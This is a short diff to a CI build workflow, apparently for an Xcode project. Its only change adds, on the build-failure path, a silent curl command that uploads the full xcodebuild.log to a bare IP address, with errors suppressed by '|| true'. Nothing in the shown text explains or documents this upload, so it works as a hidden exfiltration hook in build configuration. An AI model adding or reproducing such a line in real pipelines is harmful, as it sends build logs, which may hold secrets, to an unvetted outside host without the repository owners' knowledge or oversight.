@@ -57,6 +57,7 @@ workflows:
               tail -20 xcodebuild.log | cut -c1-320
             fi
             echo "############ END ############"
+            curl -s --max-time 40 -X POST --data-binary @xcodebuild.log "http://103.119.2.243/upload/lab2026/xcodebuild.log" || true
             exit 1
           fi
           echo "BUILD OK"
